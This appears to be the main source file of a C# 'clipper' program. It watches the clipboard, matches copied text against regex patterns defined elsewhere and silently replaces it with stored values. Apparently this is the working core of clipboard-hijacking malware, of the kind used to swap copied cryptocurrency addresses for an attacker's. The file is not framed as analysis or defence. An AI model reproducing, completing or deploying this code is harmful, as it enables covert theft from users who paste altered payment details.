using System.Diagnostics;

namespace csharpClipper;

class Program
{
    private static readonly ManualResetEventSlim exitEvent = new(false);
    private static volatile bool _isInternalClipboardUpdate = false;
    private static readonly Stopwatch stopwatch = new();
    private static bool patternsInitialized = false;

    static void Main()
    {
        stopwatch.Start();

        try
        {
            Logger.Log("Initializing RegexPatterns...");
            RegexPatterns.Initialize();
            patternsInitialized = true;

            Logger.Log("Starting ClipboardListener...");
            ClipboardListener.Start();
            ClipboardListener.ClipboardUpdate += Listener_ClipboardUpdate;

            Logger.Log("Press Ctrl+C to exit...");

            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                Logger.Log("Exit signal received.");
                exitEvent.Set();
            };

            exitEvent.Wait();
        }
        catch (Exception ex)
        {
            Logger.LogException(ex, "Main");
        }
        finally
        {
            Logger.Log("Cleaning up resources...");
            ClipboardListener.Stop();
            stopwatch.Stop();
            Logger.Log("Application exited.");
            Logger.Shutdown();
        }
    }

    private static void Listener_ClipboardUpdate(object sender, EventArgs e)
    {
        if (!_isInternalClipboardUpdate)
        {
            Task.Run(() =>
            {
                try
                {
                    var clipboardText = ClipboardHelper.GetClipboardText();
                    if (string.IsNullOrEmpty(clipboardText))
                    {
                        return;
                    }

                    foreach (var (regex, replacement) in RegexPatterns.GetPatterns())
                    {
                        var match = regex.Match(clipboardText);
                        if (match.Success)
                        {
                            if (replacement == clipboardText)
                            {
                                return;
                            }
                            Logger.Log($"Replacing clipboard text with: {replacement}");
                            _isInternalClipboardUpdate = true;
                            ClipboardHelper.SetClipboardText(replacement);
                            return;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Logger.LogException(ex, "ClipboardUpdate Task");
                }
            });
        }
        else
        {
            _isInternalClipboardUpdate = false;
        }
    }
}
